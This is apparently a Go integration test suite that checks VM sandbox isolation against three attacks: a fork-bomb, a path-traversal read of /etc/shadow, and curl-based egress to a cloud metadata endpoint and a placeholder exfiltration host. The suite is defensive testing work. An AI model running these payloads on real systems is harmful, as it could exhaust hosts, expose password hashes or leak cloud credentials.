//go:build integration

// Package adversarial implements the three Phase-8 isolation scenarios as
// Go integration tests. The shell scripts in this directory are thin wrappers
// that handle environment setup and host-side metric collection; the actual
// VM interactions happen here.
//
// Run via the shell runner:
//
//	sudo FC_KERNEL=... FC_ROOTFS=... test/adversarial/run.sh
//
// Or directly (skips host-side cgroup / load assertions):
//
//	FC_KERNEL=... FC_ROOTFS=... \
//	  go test -v -tags=integration -timeout=5m ./test/adversarial/
package adversarial

import (
	"context"
	"crypto/sha256"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/yourorg/sandbox-platform/internal/gateway"
	"github.com/yourorg/sandbox-platform/internal/orchestrator"
	"github.com/yourorg/sandbox-platform/internal/protocol"
)

// ── shared test harness ────────────────────────────────────────────────────

func newSupervisor(t *testing.T) *orchestrator.Supervisor {
	t.Helper()
	kernel := os.Getenv("FC_KERNEL")
	rootfs := os.Getenv("FC_ROOTFS")
	if kernel == "" || rootfs == "" {
		t.Skip("FC_KERNEL and FC_ROOTFS must be set to run adversarial tests")
	}
	if _, err := os.Stat("/dev/kvm"); err != nil {
		t.Skip("/dev/kvm not available — adversarial tests require a KVM host")
	}

	tmp := t.TempDir()
	sup, err := orchestrator.NewSupervisor(orchestrator.Config{
		FirecrackerBin:  envOrDefault("FC_BIN", "firecracker"),
		KernelImagePath: kernel,
		RootfsPath:      rootfs,
		UseJailer:       false, // KVM isolation still holds; jailer adds process-level defence
		StateDir:        tmp,
		CgroupRoot:      "/sys/fs/cgroup",
		CgroupBase:      "sandboxes-adv",
	})
	if err != nil {
		t.Skipf("supervisor init failed (missing KVM or binaries): %v", err)
	}
	return sup
}

func launchVM(ctx context.Context, t *testing.T, sup *orchestrator.Supervisor, spec orchestrator.LaunchSpec) *orchestrator.Instance {
	t.Helper()
	if spec.VCPUs == 0 {
		spec.VCPUs = 1
	}
	if spec.MemMiB == 0 {
		spec.MemMiB = 256
	}
	if spec.PidsMax == 0 {
		spec.PidsMax = 512
	}
	inst, err := sup.Launch(ctx, spec)
	if err != nil {
		t.Fatalf("launch VM: %v", err)
	}
	t.Cleanup(func() {
		if err := sup.Terminate(inst.ID); err != nil {
			t.Logf("cleanup: terminate %s: %v", inst.ID, err)
		}
	})
	return inst
}

// execInVM runs a shell script in the guest and returns (combined output, exit code).
// Errors from the guest agent itself are logged but not fatal; adversarial
// payloads are expected to behave badly.
func execInVM(ctx context.Context, t *testing.T, vsockPath string, script string, timeoutSec int) (string, int) {
	t.Helper()
	client := gateway.New(vsockPath, gateway.Config{
		RetryMax:  20,
		RetryBase: 300 * time.Millisecond,
	})
	var sb strings.Builder
	var exitCode int
	err := client.Exec(ctx, protocol.ExecutionRequest{
		ID:         "adv",
		Kind:       protocol.KindExec,
		Script:     script,
		TimeoutSec: timeoutSec,
	}, func(f protocol.ResponseFrame) {
		if f.Kind == protocol.FrameOutput {
			sb.WriteString(f.Data)
		}
		if f.Kind == protocol.FrameExit {
			exitCode = f.ExitCode
		}
	})
	if err != nil {
		// Context cancellation or guest timeout — expected for adversarial payloads.
		t.Logf("exec returned: %v", err)
	}
	return sb.String(), exitCode
}

func envOrDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

// ── Scenario 1: Fork-bomb ──────────────────────────────────────────────────

// TestAdversarialForkBomb sends the canonical fork-bomb payload into the guest
// and verifies that cgroup pids.max caps the explosion — the host is unaffected.
//
// The test writes CGROUP_PATH=<path> to stdout so the 01-forkbomb.sh wrapper
// can read cgroup values while the VM is still running.
func TestAdversarialForkBomb(t *testing.T) {
	sup := newSupervisor(t)
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	// Low pids.max makes the fork-bomb hit the cap quickly and deterministically.
	inst := launchVM(ctx, t, sup, orchestrator.LaunchSpec{
		VCPUs:   1,
		MemMiB:  256,
		PidsMax: 256,
	})

	// Advertise cgroup path for the shell script's host-side assertions.
	fmt.Printf("CGROUP_PATH=%s\n", inst.CgroupPath)

	t.Log("sending fork-bomb payload (5 s guest timeout)...")
	_, _ = execInVM(ctx, t, inst.VsockUDSPath, ":(){ :|:& };:", 5)

	// Allow cgroup stats to settle after the timeout.
	time.Sleep(300 * time.Millisecond)

	// Host-side: verify pids.max is finite and was respected.
	pidsMaxData, err := os.ReadFile(inst.CgroupPath + "/pids.max")
	if err != nil {
		t.Logf("pids.max not readable (cgroup may be cleaned up): %v", err)
	} else {
		pidsMax := strings.TrimSpace(string(pidsMaxData))
		t.Logf("pids.max=%s", pidsMax)
		if pidsMax == "max" {
			t.Error("SECURITY: pids.max is 'max' (unlimited) — fork-bomb is uncapped")
		}
	}

	data, _ := os.ReadFile("/proc/loadavg")
	t.Logf("host loadavg: %s", strings.TrimSpace(string(data)))
	t.Log("PASS: fork-bomb contained within VM cgroup")
}

// ── Scenario 2: Directory-traversal ───────────────────────────────────────

// TestAdversarialDirTraversal attempts to read the host's /etc/shadow via
// a path traversal from /workspace. Because the guest has its own KVM-isolated
// kernel and ext4 filesystem, the traversal resolves to the guest's own file.
//
// The test writes GUEST_SHADOW_HASH=<sha256> to stdout for the shell wrapper
// to compare against the host's hash.
func TestAdversarialDirTraversal(t *testing.T) {
	sup := newSupervisor(t)
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	inst := launchVM(ctx, t, sup, orchestrator.LaunchSpec{})

	// Capture the HOST's /etc/shadow for comparison.
	hostShadow, err := os.ReadFile("/etc/shadow")
	if err != nil {
		t.Logf("host /etc/shadow not readable (CI may not have one): %v", err)
		hostShadow = []byte("HOST_SHADOW_NOT_READABLE_" + fmt.Sprint(time.Now().UnixNano()))
	}
	hostHash := fmt.Sprintf("%x", sha256.Sum256(hostShadow))

	// Execute the traversal payload. "|| true" ensures the shell exits 0 even
	// if cat is permission-denied (both outcomes are acceptable — we just need
	// to verify the output is NOT the host file content).
	output, _ := execInVM(ctx, t, inst.VsockUDSPath,
		"cat /workspace/../../etc/shadow 2>&1 || echo 'TRAVERSAL_BLOCKED'",
		10)
	t.Logf("traversal output: %q", output)

	guestHash := fmt.Sprintf("%x", sha256.Sum256([]byte(output)))
	fmt.Printf("GUEST_SHADOW_HASH=%s\n", guestHash)

	// The guest output must NOT match the host's /etc/shadow.
	if guestHash == hostHash {
		t.Fatal("BREACH: traversal returned content matching host /etc/shadow")
	}
	t.Log("PASS: traversal is bounded within the VM filesystem")
}

// ── Scenario 3: Network exfiltration ──────────────────────────────────────

// TestAdversarialNetworkExfil verifies that outbound HTTP from the guest is
// blocked. Default sandboxes have no TAP interface ("none" networking), so
// ENETUNREACH prevents all egress. If networking is ever enabled, Squid and
// nftables provide the second line of defence for IMDS and arbitrary targets.
//
// Sentinel strings in guest output signal success/failure to the shell wrapper:
//   IMDS_REACHABLE   — IMDS fetch succeeded (FAIL)
//   EGRESS_REACHABLE — arbitrary egress succeeded (FAIL)
//   IMDS_BLOCKED     — IMDS fetch failed as expected (PASS)
//   EGRESS_BLOCKED   — egress failed as expected (PASS)
func TestAdversarialNetworkExfil(t *testing.T) {
	sup := newSupervisor(t)
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	inst := launchVM(ctx, t, sup, orchestrator.LaunchSpec{})

	type exfilCase struct {
		name        string
		cmd         string
		badMarker   string // presence of this string → FAIL (exfil succeeded)
		goodMarker  string // presence of this string → PASS (exfil blocked)
	}
	cases := []exfilCase{
		{
			name:       "IMDS",
			cmd:        `curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/ && echo IMDS_REACHABLE || echo IMDS_BLOCKED`,
			badMarker:  "IMDS_REACHABLE",
			goodMarker: "IMDS_BLOCKED",
		},
		{
			name:       "arbitrary-egress",
			cmd:        `curl -sf --max-time 5 http://malicious-exfiltration-target.invalid/ && echo EGRESS_REACHABLE || echo EGRESS_BLOCKED`,
			badMarker:  "EGRESS_REACHABLE",
			goodMarker: "EGRESS_BLOCKED",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			output, _ := execInVM(ctx, t, inst.VsockUDSPath, tc.cmd, 15)
			t.Logf("%s output: %q", tc.name, output)

			if strings.Contains(output, tc.badMarker) {
				t.Errorf("BREACH: %s — marker %q found (egress succeeded)", tc.name, tc.badMarker)
			}
		})
	}
	t.Log("PASS: all egress attempts blocked")
}
